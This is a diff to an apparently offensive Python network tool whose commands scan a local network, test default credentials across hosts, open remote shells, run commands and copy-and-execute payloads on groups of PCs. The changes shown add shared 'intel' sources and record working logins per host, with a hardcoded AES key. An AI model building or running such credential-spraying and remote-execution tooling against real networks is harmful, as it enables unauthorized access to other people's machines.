@@ -3,8 +3,8 @@ import time
 import threading
 from threading import *
 import socket
-from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES
+import re
 
 banner = '''
   /$$$$$$  /$$$$$$$$ /$$$$$$$$
@@ -16,31 +16,53 @@ banner = '''
 |  $$$$$$/| $$$$$$$$| $$
  \______/ |________/|__/
                           '''
-validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel"]
+validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel", "addsource", "delsource"]
 validDesc = [
     "Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name", "List all hosts stored on this device", "Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list",
-    "View or edit intel on a given IP"
+    "View or edit intel on a given IP", "Add an ip address to the list of shared intel sources", "Delete an ip address from the list of shared intel sources"
 ]
-validUsage = ["-", "-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip] ([add/remove] [information to add/remove])"]
+validUsage = ["-", "-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip] ([add/remove] [information to add/remove])", "addsource [IP]", "delsource [IP]"]
 
 ipNames = []
 customLists = []
-exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166, 120, 125, 142, 167, 132]
 
 completeFlags = []
 
 intel = {"10.181.231.165": ["What a legend"]}
-intelSources = ["10.181.231.159","10.181.231.139", "10.181.231.165", "10.181.231.130"]  #DELETE YOUR IP FROM THIS
+intelSources = []
 
-#CRYPTO INIT, THESE GET CHANGED REGULARL
+regex_ipv4 = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
+
+# CRYPTO INIT
 key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
 iv = b'C\xab\x8ef!C_\x13\xf5\xa2Z\xa0\xdaM\x19('
 
-#=============================================================================
-#=============================================================================
-#SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS
-#=============================================================================
-#=============================================================================
+# =============================================================================
+# =============================================================================
+# ======SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS=======
+# =============================================================================
+# =============================================================================
+
+
+def getIntelSources():  # Read from the intel_sources.txt file who we share info with
+    with open("intel_sources.txt", "r") as file:
+        for line in file:
+            intelSources.append(line.replace("\n", ""))
+
+
+def addIntelSource(source_IP):
+    with open("intel_sources.txt", "a") as file:
+        file.write("\n"+source_IP)
+
+
+def delIntelSource(source_IP):
+    with open("intel_sources.txt", "r+") as file:
+        d = file.readlines()
+        file.seek(0)
+        for i in d:
+            if i != source_IP:
+                file.write(i)
+        file.truncate()
 
 
 def readData(filename, intswitch=False):
@@ -96,6 +118,7 @@ def intelInit():
     global ipNames
     global intel
 
+    getIntelSources()
     intelPresent = checkFile("intel.txt")
     hostsPresent = checkFile("hosts.txt")
     if hostsPresent == False:
@@ -119,8 +142,7 @@ def intelWrite(suppressMsg=False):
     ipInfo = []
     for x in range(0, len(ipNames)):
         ipInfo.append([ipNames[x], customLists[x]])
-    if suppressMsg == False:
-        writeData("hosts.txt", ipInfo)
+    writeData("hosts.txt", ipInfo)
 
     intelInfo = []
     for key in intel:
@@ -374,6 +396,18 @@ def menu():
                 if cmnd == "remove":
                     updateIntel(host, info, "remove", False)
 
+        if cmd[0] == "addsource":
+            if re.match(regex_ipv4,cmd[1]):
+                addIntelSource(cmd[1])
+            else:
+                print("Not a valid IP address")
+
+        if cmd[0] == "delsource":
+            if re.match(regex_ipv4, cmd[1]):
+                delIntelSource(cmd[1])
+            else:
+                print("Not a valid IP address")
+
 
 def getintel(host):
     returnIntel = []
@@ -423,10 +457,18 @@ def credTest(creds="Profile:password", iplist="default"):
         index += 1
     while 0 in completeFlags:
         pass
+
     customLists[listIndex].sort()
     os.system("cls")
     print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
     print("[+] " + str(customLists[listIndex]).replace(" ", ""))
+    loginString = "LOGIN: " + username + ":" + password
+    for item in customLists[listIndex]:
+        updateIntel(item, loginString, online=False, suppress=True)
+    for item in customLists[0]:
+        if item not in customLists[listIndex]:
+            updateIntel(item, loginString, action="remove", online=False, suppress=True)
+
     intelWrite()
 
 
@@ -459,9 +501,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
         infostring = "LOGIN: " + uname + ":" + pword
         if str(resp) == "0":
             customLists[listIndex].append(ending)
-            updateIntel(tgt, infostring)
-        else:
-            updateIntel(tgt, infostring, action="remove")
+
 
     completeFlags[index] = 1
 
